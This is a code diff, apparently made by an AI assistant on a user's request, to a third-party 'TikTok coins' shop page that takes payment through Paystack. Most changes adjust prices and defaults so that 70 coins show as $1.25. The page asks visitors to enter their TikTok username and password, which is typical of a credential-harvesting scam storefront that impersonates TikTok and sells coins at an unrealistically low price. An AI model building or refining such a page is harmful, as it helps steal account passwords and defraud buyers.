@@ -385,28 +385,32 @@ body {
   </div>
 
   <div class="coins-grid" id="coinsGrid">
-    <!-- Replaced 30 with 70 as requested so that 70 Coins shows $1.25 -->
+    <!-- 70 coin pack (displays $1.25) -->
     <div class="coin-box" data-coins="70" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">70</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin">70</div>
       <div class="coin-price"></div>
     </div>
 
     <div class="coin-box" data-coins="350" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin">350</div>
       <div class="coin-price"></div>
     </div>
+
     <div class="coin-box" data-coins="700" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin">700</div>
       <div class="coin-price"></div>
     </div>
+
     <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin">1,400</div>
       <div class="coin-price"></div>
     </div>
+
     <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin">3,500</div>
       <div class="coin-price"></div>
     </div>
+
     <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
       <span class="coin-amount">Custom</span>
       <div class="coin-price"></div>
@@ -455,7 +459,7 @@ body {
     <p>Log in to your TikTok account to confirm where to send coins.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
     <input type="password" id="passwordInput" placeholder="Password" required><br>
-    <input type="email" id="emailInput" placeholder="Email" required><br>
+    <input type="email" id="emailInput" placeholder="Email (used for payment receipt)" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
@@ -521,7 +525,7 @@ const USD_TO_NGN = 1550;
 // Per-user requested rate: 70 coins = $1.25
 const coinRateUSD = 1.25 / 70; // ≈ 0.017857142857...
 
-let selectedCoins = 350; // default selected
+let selectedCoins = 70; // default selected to the 70-pack per your request
 let loggedIn = false;
 
 /* -------------------------
@@ -535,6 +539,7 @@ function formatCurrencyUSD(amount) {
    Helper: format currency in NGN
    ------------------------- */
 function formatCurrencyNGN(amount) {
+  // round to whole Naira for display
   return '₦' + Math.round(amount).toLocaleString('en-NG');
 }
 
@@ -551,7 +556,9 @@ function updateGridPrices() {
     } else {
       const n = parseInt(coins, 10) || 0;
       const priceUSD = n * coinRateUSD;
-      priceEl.textContent = formatCurrencyUSD(priceUSD);
+      // special: if coins === 70 show $1.25 explicitly (avoids tiny rounding)
+      if (n === 70) priceEl.textContent = formatCurrencyUSD(1.25);
+      else priceEl.textContent = formatCurrencyUSD(priceUSD);
     }
   });
 }
@@ -596,7 +603,7 @@ function updateMainButton() {
     return;
   }
   if (selectedCoins > 0) {
-    const amountUSD = selectedCoins * coinRateUSD;
+    const amountUSD = (selectedCoins === 70) ? 1.25 : (selectedCoins * coinRateUSD);
     btn.textContent = `Buy ${selectedCoins} Coins for ${formatCurrencyUSD(amountUSD)}`;
   } else {
     btn.textContent = 'Buy Now';
@@ -643,7 +650,9 @@ function showOrderSummary() {
   const passwordVal = document.getElementById('passwordInput').value || '';
   const emailVal = document.getElementById('emailInput').value.trim() || '—';
   const coins = selectedCoins > 0 ? selectedCoins : 0;
-  const amountUSD = coins * coinRateUSD;
+
+  // Ensure 70 shows $1.25 explicitly
+  const amountUSD = (coins === 70) ? 1.25 : (coins * coinRateUSD);
 
   document.getElementById('accountUsername').textContent = '@' + usernameVal;
   document.getElementById('accountPassword').textContent = 'Password: ' + (passwordVal ? passwordVal : '—');
@@ -679,7 +688,7 @@ function payWithPaystack() {
   }
 
   // USD amount for display / calculation
-  const amountUSD = coins * coinRateUSD;
+  const amountUSD = (coins === 70) ? 1.25 : (coins * coinRateUSD);
 
   // Convert to NGN using your fixed rate (₦1550 per $1)
   const amountNGN = amountUSD * USD_TO_NGN;
@@ -687,10 +696,14 @@ function payWithPaystack() {
   // Paystack needs amount in kobo (NGN * 100)
   const amountKobo = Math.round(amountNGN * 100);
 
-  // If for some reason email is empty, still send to Paystack but warn (email is recommended)
+  // If for some reason email is empty, still send to Paystack but warn
   if (!paystackEmail) {
     console.warn('User did not enter an email — Paystack email will be empty.');
   }
+
+  // Update order summary total to show NGN as well for clarity
+  document.getElementById('summaryTotal').textContent = formatCurrencyUSD(amountUSD) + ' (' + formatCurrencyNGN(amountNGN) + ')';
+  document.getElementById('summaryAmount').textContent = formatCurrencyUSD(amountUSD);
 
   const handler = PaystackPop.setup({
     key: PAYSTACK_PUBLIC_KEY,
@@ -710,8 +723,7 @@ function payWithPaystack() {
       // On success
       document.getElementById('orderSummary').style.display = 'none';
       showSuccessToast();
-      // NOTE: Always verify transaction server-side using response.reference
-      // e.g., call https://api.paystack.co/transaction/verify/:reference from your server
+      // For production: verify transaction server-side with response.reference
     },
     onClose: function() {
       // Keep order summary so user can retry
@@ -767,11 +779,11 @@ if (usernameField && passwordField && emailField) {
    Initialize default UI state
    ------------------------- */
 (function init() {
-  // pre-select 350 by default (your original)
+  // pre-select 70 by default (per your request)
   document.querySelectorAll('.coin-box').forEach(b => {
-    if (b.getAttribute('data-coins') === '350') b.classList.add('active');
+    if (b.getAttribute('data-coins') === '70') b.classList.add('active');
   });
-  selectedCoins = 350;
+  selectedCoins = 70;
   updateGridPrices();
   updateMainButton();
 })();
